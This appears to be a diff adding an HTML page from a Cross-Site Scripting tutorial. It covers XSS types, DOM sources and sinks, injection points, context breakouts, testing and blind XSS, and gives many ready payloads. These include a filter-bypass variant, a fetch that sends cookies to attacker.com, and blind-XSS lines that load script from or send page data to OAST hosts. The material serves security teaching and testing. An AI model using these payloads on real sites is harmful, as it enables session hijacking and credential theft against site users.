+            <li><a href="#react--dangerous-html-rendering"><strong>React – Dangerous HTML Rendering</strong></a></li>
+            <li><a href="#flow-of-attack--2"><strong>Flow of Attack :</strong></a></li>
+            <li><a href="#payloads--1"><strong>Payloads :</strong></a></li>
+            <li><a href="#4-jquery">4. jQuery</a></li>
+            <li><a href="#jquery--xss-via-improper-html-handlingcve-2020-7656"><strong>jQuery – XSS via Improper HTML Handling(CVE-2020-7656)</strong></a></li>
+            <li><a href="#flow-of-attack--3"><strong>Flow of Attack :</strong></a></li>
+            <li><a href="#payload--2"><strong>Payload :</strong></a></li>
+            <li><a href="#xss-via-prototype-pollutioncve-2019-11358"><strong>XSS via Prototype Pollution</strong>(CVE-2019-11358)</a></li>
+            <li><a href="#flow-of-attack--4"><strong>Flow of Attack :</strong></a></li>
+            <li><a href="#payloads--2"><strong>Payloads :</strong></a></li>
+            <li><a href="#5-django">5. Django</a></li>
+            <li><a href="#django--unsafe-template-rendering"><strong>Django – Unsafe Template Rendering</strong></a></li>
+            <li><a href="#flow-of-attack--5"><strong>Flow of Attack :</strong></a></li>
+            <li><a href="#payloads--3"><strong>Payloads :</strong></a></li>
+          </ul>
+        </li>
+        <li><a href="#encoding-and-obfuscation">Encoding and Obfuscation</a>
+          <ul>
+            <li><a href="#encoding"><strong>Encoding</strong></a></li>
+            <li><a href="#obfuscation"><strong>Obfuscation</strong></a></li>
+          </ul>
+        </li>
+        <li><a href="#waf-bypasses-techniques"><strong>WAF Bypasses Techniques</strong></a>
+          <ul>
+            <li><a href="#flow-after-encoding--obfuscation-"><strong>FLOW After encoding , obfuscation :</strong></a></li>
+          </ul>
+        </li>
+        <li><a href="#impacts-of-xss">Impacts of XSS</a>
+          <ul>
+            <li><a href="#1-session-hijacking"><strong>1. Session Hijacking</strong></a></li>
+            <li><a href="#2-credential-theft"><strong>2. Credential Theft</strong></a></li>
+            <li><a href="#3-keylogging"><strong>3. Keylogging</strong></a></li>
+            <li><a href="#4-phishing-through-dom-injection"><strong>4. Phishing Through DOM Injection</strong></a></li>
+            <li><a href="#5-malware-distribution"><strong>5. Malware Distribution</strong></a></li>
+            <li><a href="#6-account-takeover--privilege-abuse"><strong>6. Account Takeover / Privilege Abuse</strong></a></li>
+            <li><a href="#7-csrf-automation-via-xss"><strong>7. CSRF Automation via XSS</strong></a></li>
+            <li><a href="#8-internal-network-scanning"><strong>8. Internal Network Scanning</strong></a></li>
+            <li><a href="#9-stored-worm--self-propagating-xss"><strong>9. Stored Worm / Self-Propagating XSS</strong></a></li>
+            <li><a href="#10-browser-exploitation"><strong>10. Browser Exploitation</strong></a></li>
+            <li><a href="#11-data-exfiltration"><strong>11. Data Exfiltration</strong></a></li>
+            <li><a href="#12-ui-redressing--clickjacking-assistance"><strong>12. UI Redressing / Clickjacking Assistance</strong></a></li>
+            <li><a href="#13-stored-defacement"><strong>13. Stored Defacement</strong></a></li>
+            <li><a href="#14-supply-chain-attack-via-xss"><strong>14. Supply-Chain Attack via XSS</strong></a></li>
+            <li><a href="#15-email--notification-hijacking"><strong>15. Email / Notification Hijacking</strong></a></li>
+          </ul>
+        </li>
+        <li><a href="#prevention-techniques">Prevention Techniques</a>
+          <ul>
+            <li><a href="#input-validation">Input Validation</a></li>
+            <li><a href="#output-encoding">Output Encoding</a></li>
+            <li><a href="#content-security-policy-csp">Content Security Policy (CSP)</a></li>
+            <li><a href="#secure-cookies">Secure Cookies</a></li>
+            <li><a href="#safe-dom-handling">Safe DOM Handling</a></li>
+          </ul>
+        </li>
+        <li><a href="#tools">Tools</a></li>
+        <li><a href="#references">References</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+
+  </aside>
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown"><h1 id="cross-site-scripting-xss">
+  Cross-Site Scripting (XSS)
+  <a class="anchor" href="#cross-site-scripting-xss">#</a>
+</h1>
+<p>Cross-Site Scripting (XSS) is a web security vulnerability that allows attackers to inject malicious client-side scripts into web pages viewed by other users. It is one of the most prevalent security issues in modern web applications and can lead to serious consequences including data theft, session hijacking, malware distribution, and unauthorized actions on behalf of authenticated users.</p>
+<h2 id="types-of-xss-attacks">
+  Types of XSS Attacks
+  <a class="anchor" href="#types-of-xss-attacks">#</a>
+</h2>
+<h3 id="1-reflected-xss">
+  1. Reflected XSS
+  <a class="anchor" href="#1-reflected-xss">#</a>
+</h3>
+<ul>
+<li>Malicious script is reflected from the server response without being stored</li>
+<li>Typically delivered via crafted URLs, phishing emails, or malicious links</li>
+<li>Requires user interaction (clicking link, submitting form)</li>
+<li>Affects only users who access the malicious URL.</li>
+</ul>
+<p>Example:</p>
+<pre tabindex="0"><code>https://example.com/search?q=&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre><h3 id="2-stored-xss">
+  2. Stored XSS
+  <a class="anchor" href="#2-stored-xss">#</a>
+</h3>
+<ul>
+<li>Malicious script is permanently stored on the server (database, file system, logs)</li>
+<li>Automatically executed when users access the affected page</li>
+<li>Affects all users who view the compromised content.</li>
+<li>Most dangerous type as it requires no social engineering.</li>
+</ul>
+<p>Example:</p>
+<pre tabindex="0"><code>&lt;https://example.com/search?q=&gt;&lt;img src=x onerror=alert(document.cookie)&gt;
+</code></pre><h3 id="3-dom-based-xss">
+  3. DOM-Based XSS
+  <a class="anchor" href="#3-dom-based-xss">#</a>
+</h3>
+<ul>
+<li>Vulnerability exists entirely in client-side JavaScript.</li>
+<li>Attack payload is executed during DOM manipulation.</li>
+<li>Server response remains unchanged; attack happens in browser.</li>
+<li>Sources (input) flow to sinks (output) without proper sanitization.</li>
+</ul>
+<p>Vulnerable JavaScript Code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>document.<span style="color:#a6e22e">write</span>(<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">hash</span>.<span style="color:#a6e22e">substring</span>(<span style="color:#ae81ff">1</span>));
+</span></span></code></pre></div><p>Exploit URL:</p>
+<pre tabindex="0"><code>https://test.com/#&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre><h3 id="sources">
+  Sources:
+  <a class="anchor" href="#sources">#</a>
+</h3>
+<ul>
+<li><strong>Sources</strong> are where user-controllable input enters the JavaScript environment.</li>
+</ul>
+<p><strong>Common Sources (User Input):</strong></p>
+<ul>
+<li><code>location.hash</code> - URL fragment after #</li>
+<li><code>location.search</code> - Query parameters</li>
+<li><code>document.referrer</code> - Referrer URL</li>
+<li><code>window.name</code> - Window name property</li>
+<li><code>document.cookie</code> - Cookies</li>
+<li><code>localStorage</code>/<code>sessionStorage</code> - Web storage</li>
+</ul>
+<h3 id="sinks">
+  Sinks:
+  <a class="anchor" href="#sinks">#</a>
+</h3>
+<ul>
+<li><strong>Sinks</strong> are dangerous JavaScript functions/properties that execute or render content.</li>
+</ul>
+<p><strong>Common Sinks (Dangerous Functions):</strong></p>
+<ul>
+<li><code>element.innerHTML</code> / <code>element.outerHTML</code> - HTML rendering</li>
+<li><code>document.write()</code> / <code>document.writeln()</code> - Direct document writing</li>
+<li><code>eval()</code> / <code>Function()</code> - Code execution</li>
+<li><code>setTimeout()</code> / <code>setInterval()</code> (with string arguments) - Dynamic execution</li>
+<li><code>location</code> / <code>location.href</code> - URL navigation</li>
+<li><code>element.onclick</code> / <code>element.onerror</code> - Event handlers</li>
+</ul>
+<h3 id="examples">
+  Examples:
+  <a class="anchor" href="#examples">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#75715e">// Example 1: innerHTML sink
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">name</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">search</span>.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#39;name=&#39;</span>)[<span style="color:#ae81ff">1</span>];
+</span></span><span style="display:flex;"><span>document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;output&#39;</span>).<span style="color:#a6e22e">innerHTML</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">name</span>;
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Payload: ?name=&lt;img src=x onerror=alert(1)&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Example 2: eval() sink
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">code</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">hash</span>.<span style="color:#a6e22e">substring</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>eval(<span style="color:#a6e22e">code</span>);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Payload: #alert(document.cookie)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Example 3: location.href sink
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">redirect</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">URLSearchParams</span>(<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">search</span>).<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;url&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">href</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">redirect</span>;
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Payload: ?url=javascript:alert(1)
+</span></span></span></code></pre></div><hr>
+<h2 id="common-xss-vectors">
+  Common XSS Vectors:
+  <a class="anchor" href="#common-xss-vectors">#</a>
+</h2>
+<h3 id="user-input-injection-points">
+  User Input Injection Points
+  <a class="anchor" href="#user-input-injection-points">#</a>
+</h3>
+<p><strong>Search Bars</strong> - User input appears in search results page</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>Payload: &lt;<span style="color:#f92672">script</span>&gt;<span style="color:#a6e22e">alert</span>(<span style="color:#ae81ff">1</span>)&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>What happens: You search for &#34;test&#34; and see &#34;Results for: test&#34;
+</span></span><span style="display:flex;"><span>Attack: Replace &#34;test&#34; with XSS payload
+</span></span></code></pre></div><p><strong>Comment Sections</strong> - Your comment gets displayed to other users</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>Payload: &lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">x</span> <span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#e6db74">alert(1)</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>What happens: Your comment shows on the page for everyone
+</span></span><span style="display:flex;"><span>Attack: When others view page, your payload executes
+</span></span></code></pre></div><p><strong>Contact Forms</strong> - Admin views form submissions in backend</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>Payload: &lt;<span style="color:#f92672">script</span>&gt;<span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;&lt;http://attacker.com/steal?data=&#39;</span><span style="color:#f92672">+</span>document.<span style="color:#a6e22e">cookie</span><span style="color:#f92672">&gt;</span>)&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>What happens: Admin sees your contact form message in admin panel
+</span></span><span style="display:flex;"><span>Attack: Steal admin cookies when they view your submission
+</span></span></code></pre></div><p><strong>Profile Fields</strong> - Your profile info displays to other users</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>Payload: &#34; onmouseover=alert(1) class=&#34;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>What happens: Your bio appears as &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;bio &#34;</span> <span style="color:#a6e22e">onmouseover</span><span style="color:#f92672">=</span><span style="color:#e6db74">alert(1)</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>Attack: Anyone hovering over your profile triggers the payload
+</span></span></code></pre></div><p><strong>URL Parameters</strong> - Parameters reflected in page content</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>URL: &lt;<span style="color:#f92672">https:</span><span style="color:#960050;background-color:#1e0010">//</span><span style="color:#a6e22e">site</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#a6e22e">com</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#a6e22e">page</span><span style="color:#960050;background-color:#1e0010">?</span><span style="color:#a6e22e">message</span><span style="color:#f92672">=</span><span style="color:#e6db74">Welcome</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Attack: &lt;<span style="color:#f92672">https:</span><span style="color:#960050;background-color:#1e0010">//</span><span style="color:#a6e22e">site</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#a6e22e">com</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#a6e22e">page</span><span style="color:#960050;background-color:#1e0010">?</span><span style="color:#a6e22e">message</span><span style="color:#f92672">=</span><span style="color:#960050;background-color:#1e0010">&gt;</span><span style="color:#e6db74">&lt;script</span>&gt;alert(1)&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>What happens: Page displays &#34;Welcome&#34; → becomes XSS execution
+</span></span></code></pre></div><p><strong>File Upload Forms</strong> - Upload malicious HTML/SVG files</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>SVG Payload: &lt;<span style="color:#f92672">svg</span> <span style="color:#a6e22e">onload</span><span style="color:#f92672">=</span><span style="color:#e6db74">alert(1)</span>&gt;     // store in a svg file
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>What happens: You upload profile picture as SVG file
+</span></span><span style="display:flex;"><span>Attack: When page displays your &#34;image&#34;, code executes
+</span></span></code></pre></div><p><strong>Login Forms</strong> - Error messages reflect user input</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>Username: &lt;<span style="color:#f92672">script</span>&gt;<span style="color:#a6e22e">alert</span>(<span style="color:#ae81ff">1</span>)&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>What happens: Error shows &#34;User &lt;<span style="color:#f92672">script</span>&gt;<span style="color:#a6e22e">alert</span>(<span style="color:#ae81ff">1</span>)&lt;/<span style="color:#f92672">script</span>&gt; not found&#34;
+</span></span><span style="display:flex;"><span>Attack: Error message becomes XSS vector
+</span></span></code></pre></div><p><strong>HTTP Headers</strong> - Some headers reflected in page</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>User-Agent: &lt;<span style="color:#f92672">script</span>&gt;<span style="color:#a6e22e">alert</span>(<span style="color:#ae81ff">1</span>)&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>Referer: &lt;<span style="color:#f92672">https:</span><span style="color:#960050;background-color:#1e0010">//</span><span style="color:#a6e22e">site</span><span style="color:#960050;background-color:#1e0010">.</span><span style="color:#a6e22e">com</span>/&gt;&lt;<span style="color:#f92672">script</span>&gt;<span style="color:#a6e22e">alert</span>(<span style="color:#ae81ff">1</span>)&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>What happens: Server reflects headers in page content and XSS payload executes
+</span></span></code></pre></div><hr>
+<h2 id="testing-for-xss-">
+  <strong>Testing for XSS :</strong>
+  <a class="anchor" href="#testing-for-xss-">#</a>
+</h2>
+<h3 id="1-manual-fuzzing">
+  <strong>1. Manual Fuzzing</strong>
+  <a class="anchor" href="#1-manual-fuzzing">#</a>
+</h3>
+<ul>
+<li>Inject common + advanced payloads (<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>, event handlers, HTML breaks, JS URIs).</li>
+<li>Test all input sinks: parameters, headers, cookies, hidden fields, JSON bodies.</li>
+<li>Try both reflected &amp; stored flows; observe DOM changes using DevTools.</li>
+</ul>
+<h3 id="2-automated-scanners">
+  <strong>2. Automated Scanners</strong>
+  <a class="anchor" href="#2-automated-scanners">#</a>
+</h3>
+<ul>
+<li>Use Burp Suite Active Scan, ZAP, or XSpear to detect reflections, DOM sinks, and dangerous contexts.</li>
+<li>Combine with Intruder/ fuzz lists for wide payload coverage.</li>
+<li>Always validate scanner findings manually (false positives are common).</li>
+</ul>
+<h3 id="3-code-review">
+  <strong>3. Code Review</strong>
+  <a class="anchor" href="#3-code-review">#</a>
+</h3>
+<ul>
+<li>Identify unsafe sinks: <code>innerHTML</code>, <code>document.write</code>, jQuery <code>.html()</code>, Vue/React dynamic bindings, template engines.</li>
+<li>Track untrusted data flow to DOM APIs.</li>
+<li>Check server-side sanitization/encoding logic &amp; CSP configuration.</li>
+</ul>
+<h3 id="4-realistic-attack-simulations">
+  <strong>4. Realistic Attack Simulations</strong>
+  <a class="anchor" href="#4-realistic-attack-simulations">#</a>
+</h3>
+<ul>
+<li>Craft payloads that steal cookies, tokens, keystrokes, or perform CSRF actions.</li>
+<li>Test bypasses: encoding, obfuscation, WAF evasion, CSP gaps.</li>
+<li>Validate exploitation chain: XSS → CSRF → account takeover / data exfiltration.</li>
+</ul>
+<hr>
+<h2 id="basic-xss-contexts--breakouts">
+  Basic XSS Contexts &amp; Breakouts
+  <a class="anchor" href="#basic-xss-contexts--breakouts">#</a>
+</h2>
+<h3 id="html-context">
+  HTML Context:
+  <a class="anchor" href="#html-context">#</a>
+</h3>
+<p>Use when your input appears directly in the page HTML body:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;<span style="color:#a6e22e">alert</span>(<span style="color:#ae81ff">1</span>)&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">x</span> <span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#e6db74">alert(1)</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">svg</span> <span style="color:#a6e22e">onload</span><span style="color:#f92672">=</span><span style="color:#e6db74">alert(1)</span>&gt;
+</span></span></code></pre></div><h3 id="attribute-context">
+  Attribute Context
+  <a class="anchor" href="#attribute-context">#</a>
+</h3>
+<p>Use when your input is reflected inside HTML tag attributes - Break out of the attribute first</p>
+<p>Payloads:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&#34;&gt;&lt;<span style="color:#f92672">script</span>&gt;<span style="color:#a6e22e">alert</span>(<span style="color:#ae81ff">1</span>)&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>&#34; autofocus onfocus=alert(1) x=&#34;
+</span></span><span style="display:flex;"><span>&#39; onclick=alert(1) x=&#39;
+</span></span></code></pre></div><p><strong>Href attribute:</strong></p>
+<ul>
+<li>For href attributes specifically, use javascript protocol:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;javascript:alert(1)&#34;</span>&gt;Click&lt;/<span style="color:#f92672">a</span>&gt;
+</span></span></code></pre></div><h3 id="javascript-context">
+  JavaScript Context
+  <a class="anchor" href="#javascript-context">#</a>
+</h3>
+<p>Use when your input appears inside existing JavaScript code - break out of strings:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&#39;;alert(1);//
+</span></span><span style="display:flex;"><span>&#39;;alert(1)//
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;&lt;<span style="color:#f92672">script</span>&gt;<span style="color:#a6e22e">alert</span>(<span style="color:#ae81ff">1</span>)&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div><p>When inside template literals (backticks), use interpolation:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>${alert(1)}
+</span></span><span style="display:flex;"><span>`${alert(1)}`
+</span></span><span style="display:flex;"><span>&#39;+alert(1)+&#39;
+</span></span><span style="display:flex;"><span>&#34;+alert(1)+&#34;
+</span></span></code></pre></div><h3 id="url-context">
+  URL Context
+  <a class="anchor" href="#url-context">#</a>
+</h3>
+<p>Use when input is used in navigation URLs - prefix with javascript protocol:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">javascript</span><span style="color:#f92672">:</span><span style="color:#a6e22e">alert</span>(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">jaVaScRipt</span><span style="color:#f92672">:</span><span style="color:#a6e22e">alert</span>(<span style="color:#ae81ff">1</span>)        <span style="color:#75715e">// Mixed case for filter bypass
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">javascript</span><span style="color:#f92672">:</span><span style="color:#a6e22e">confirm</span>(document.<span style="color:#a6e22e">cookie</span>)
+</span></span></code></pre></div><h3 id="event-handlers">
+  Event Handlers
+  <a class="anchor" href="#event-handlers">#</a>
+</h3>
+<p>Use when you can inject into HTML event attributes - no script tags needed:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">onclick</span><span style="color:#f92672">=</span><span style="color:#a6e22e">alert</span>(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">onmouseover</span><span style="color:#f92672">=</span><span style="color:#a6e22e">alert</span>(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">onload</span><span style="color:#f92672">=</span><span style="color:#a6e22e">alert</span>(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#a6e22e">alert</span>(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">onfocus</span><span style="color:#f92672">=</span><span style="color:#a6e22e">alert</span>(<span style="color:#ae81ff">1</span>)
+</span></span></code></pre></div><hr>
+<h2 id="blind-xss">
+  <strong>Blind XSS</strong>
+  <a class="anchor" href="#blind-xss">#</a>
+</h2>
+<ul>
+<li>Blind XSS occurs when a malicious script gets stored and later executed <strong>in a different environment</strong> than where the attacker injected it - typically on <strong>internal dashboards, logs, or review panels</strong> that the attacker cannot see.</li>
+<li>Execution happens when <strong>any user or system process</strong> with access to that backend interface loads the malicious data.</li>
+<li>While this often includes <strong>admins or support staff</strong>, it can also affect <strong>moderators, analysts, automated log viewers, or any internal role</strong> that processes the stored input.</li>
+</ul>
+<h3 id="key-characteristics">
+  <strong>Key Characteristics</strong>
+  <a class="anchor" href="#key-characteristics">#</a>
+</h3>
+<ul>
+<li>Execution is <em>delayed</em> (not immediate).</li>
+<li>Injection point is <em>hidden</em> from the attacker.</li>
+<li>Requires <strong>OAST</strong> (out-of-band techniques) for detection.</li>
+<li>Can impact <strong>any internal or higher-privileged user/process</strong>, not only admins - leading to data theft or full system compromise.</li>
+</ul>
+<hr>
+<h2 id="detecting-blind-xss">
+  <strong>Detecting Blind XSS</strong>
+  <a class="anchor" href="#detecting-blind-xss">#</a>
+</h2>
+<p>Blind XSS requires out-of-band callbacks via tools such as:</p>
+<ul>
+<li><strong>XSS Hunter</strong></li>
+<li><strong>XSS Hunter Express</strong></li>
+<li><strong>Burp Collaborator</strong></li>
+<li><strong>Interactsh</strong></li>
+</ul>
+<p><strong>Common injection points:</strong></p>
+<ul>
+<li>Feedback/contact forms</li>
+<li>Analytics parameters (utm_*)</li>
+<li>Request headers (User-Agent, Referer, X-Forwarded-For)</li>
+<li>Blog/help search boxes</li>
+<li>Error messages / logs</li>
+<li>Order invoices, billing name, address</li>
+</ul>
+<blockquote>
+<p><strong>Always keep your OAST endpoint running because execution time is unpredictable.</strong></p>
+</blockquote>
+<hr>
+<h2 id="exploiting-blind-xss">
+  <strong>Exploiting Blind XSS</strong>
+  <a class="anchor" href="#exploiting-blind-xss">#</a>
+</h2>
+<p>Since you cannot see the execution, exploitation requires <strong>JavaScript spyware</strong> that:</p>
+<ul>
+<li>Sends callbacks containing user data</li>
+<li>Steals cookies, tokens, DOM content</li>
+<li>Monitors victim activity</li>
+<li>Performs CSRF or actions on behalf of the user</li>
+</ul>
+<p>Typically achieved by loading an external malicious JS file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&#34;&gt;&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://your-oast.com/script.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div><hr>
+<h2 id="blind-xss-payloads">
+  <strong>Blind XSS Payloads</strong>
+  <a class="anchor" href="#blind-xss-payloads">#</a>
+</h2>
+<h3 id="1-image-only-html-injection-check">
+  <strong>1. Image-only (HTML Injection Check)</strong>
+  <a class="anchor" href="#1-image-only-html-injection-check">#</a>
+</h3>
+<p>Used when you only want to confirm HTML rendering in an internal panel without executing JS. It triggers a simple image request to your server.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&#39;&#34;&gt;&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://example.burpcollaborator.net/image&#34;</span>&gt;
+</span></span></code></pre></div><hr>
+<h3 id="2-image-tag-blind-xss">
+  <strong>2. Image-tag Blind XSS</strong>
+  <a class="anchor" href="#2-image-tag-blind-xss">#</a>
+</h3>
+<p>Used when script tags are blocked but event handlers work; the broken image executes JS internally. It sends location or page content to your OAST server.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&#39;&#34;&gt;&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://example.burpcollaborator.net/image-only&#34;</span> <span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;this.src=&#34;https://example.burpcollaborator.net/image-xss?&#34;+btoa(document.location)&#39;</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&#39;&#34;&gt;&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">x</span> <span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;this.src=&#34;https://example.burpcollaborator.net/image-xss?&#34;+btoa(document.location)&#39;</span>&gt;
